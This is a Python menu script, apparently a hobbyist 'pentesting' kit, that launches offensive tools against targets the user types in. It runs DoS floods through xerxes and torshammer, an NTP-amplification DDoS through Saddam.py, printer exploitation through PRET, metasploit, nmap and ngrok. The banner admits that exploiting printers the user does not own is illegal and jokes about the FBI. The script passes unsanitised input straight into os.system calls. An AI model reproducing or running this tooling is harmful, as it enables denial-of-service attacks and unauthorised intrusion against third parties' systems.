#!/usr/bin/python
#coded by SAINT-ETERNALBLUE


import os
import time
import sys
class color:
    HEADER = '\033[0m'

logo = color.HEADER + '''
  ____                              _  ___ _
 / ___|_ __ _____   _____          | |/ (_) |_
| |  _| '__/ _ \ \ / / _ \  _____  | ' /| | __|
| |_| | | | (_) \ V /  __/ |_____| | . \| | |_
 \____|_|  \___/ \_/ \___|         |_|\_\_|\__| v. 3 (Almost ready! LMAO)

                    AKA small pentesting sploit
                        by Saint-Eternalblue
FAQ:
----------------------------------------------
U:How do it works?

ME: It uses PRET and ur list of IP's to exploit!

U: Is it illigal to exploit not my printer?

ME: yes :(
----------------------------------------------
ME:
vk.com/eternalbluehack
t.me/reverseengineeringg
boyofhell5551577@gmail.com
https://github.com/colorblindpentester
PRET:
https://github.com/RUB-NDS/PRET
----------------------------------------------
PRET AND I ARE NOT FUCKING RESPLOSIBLE FOR THAT
so if FBI will come to ur house, remember,
this is ur fault
----------------------------------------------
'''
print(logo)
print ('\x1b[1;32;40m' +' Welkome home homie.''\x1b[0m')
print('')
print ('\x1b[1;32;40m' +' press 1 for DoS attack (xerxes) (still working on, it doesnt work now sorry D:)''\x1b[0m')
print ('\x1b[1;32;40m' +' press 2 for metasploit.''\x1b[0m')
print ('\x1b[1;32;40m' +' press 3 for DDoS atack.''\x1b[0m')
print ('\x1b[1;32;40m' +' press 4 to open Xterm.''\x1b[0m')
print ('\x1b[1;32;40m' +' press 5 for scanning.''\x1b[0m')
print ('\x1b[1;32;40m' +' press 6 for exploiting printers (My PSPLOIT + PRET) .''\x1b[0m')
print ('\x1b[1;32;40m' +' press 7 start ngrok.''\x1b[0m')
print ('\x1b[1;32;40m' +' press 8 to use DoS (torshammer).''\x1b[0m')
run1 = input ("What tool u want to use?: ")
if run1 =="6":
    os.system("clear")
    print ('\x1b[1;32;40m' +' Grove street - home.''\x1b[0m')
    print ('\x1b[1;32;40m' +' ok, ok we are starting kid!.''\x1b[0m')
    os.system("xterm -hold -e chmod +x psploitrun.bash ")
    os.system("./psploitrun.bash")
if run1 =="2":
    os.system("clear")
    print ('\x1b[1;32;40m' +' Grove street - home.''\x1b[0m')
    os.system("xterm -hold msfconsole")
if run1 =="1":
    os.system("clear")
    print ('\x1b[1;32;40m' +' Grove street - home.''\x1b[0m')
    rundos = input ("enter a target to DoS: ")
    rundosp = input ("enter a target port: ")
    os.system("xterm -hold -e chmod 777 xerxes && ./xerxes %s %s" % (rundos, rundosp))
if run1 =="3":
    os.system("clear")
    print ('\x1b[1;32;40m' +' Grove street - home.''\x1b[0m')
    rundos2 = input ("enter a target to DDoS: ")
    rundosthr = input ("enter a threads to DDoS: ")
    os.system("xterm -hold -e python Saddam.py %s --ntp=NTPDDoS.txt --threads=%s" % (rundos2, rundosthr))
if run1 =="4":
    os.system("clear")
    print ('\x1b[1;32;40m' +' Wait how did u get here mate?.''\x1b[0m')
    os.system("xterm ")
if run1 =="5":
    os.system("clear")
    print ('\x1b[1;32;40m' +' Grove street - home.''\x1b[0m')
    rundosscan = input ("enter a target to scan: ")
    os.system("xterm -hold -e nmap %s -Pn" % rundosscan)
if run1 =="7":
    os.system("clear")
    print ('\x1b[1;32;40m' +' Grove street - home.''\x1b[0m')
    ngport = input ("enter a ngrok port: ")
    print ('\x1b[1;32;40m' +' Starting ngrok.''\x1b[0m')
    os.system("chmod +x ngrok")
    os.system("xterm -hold -e ./ngrok http %s" % ngport) 
if run1 =="8":
    os.system("clear")
    print ('\x1b[1;32;40m' +' Grove street - home.''\x1b[0m')
    ham = input ("enter a target: ")
    hamp = input ("enter threads: ")
    os.system("python torshammer.py -t %s -r %s" % (ham, hamp))
class color:
    HEADER = '\033[0m'

logo = color.HEADER + '''
      ________________
    _/_______________/|
   /___________/___//||  
  |===        |----| ||    
  |           |   ô| ||
  |___________|   ô| ||
  | ||/.´---.||    | ||      BYE BYE MY HOMIE
  |-||/_____\||-.  | |´         
  |_||=L==H==||_|__|/

     (ASCII art by
     Jan Foerster)
                    
'''
print(logo)
print ('\x1b[1;32;40m' +' Bey my mate.''\x1b[0m')
print ('\x1b[1;32;40m' +' Thank you for using my script :3.''\x1b[0m')
print ('\x1b[1;32;40m' +' And dont worry about FBI.''\x1b[0m')
print ('\x1b[1;32;40m' +' We will met at Grove street homie.''\x1b[0m')



    
    
    
    

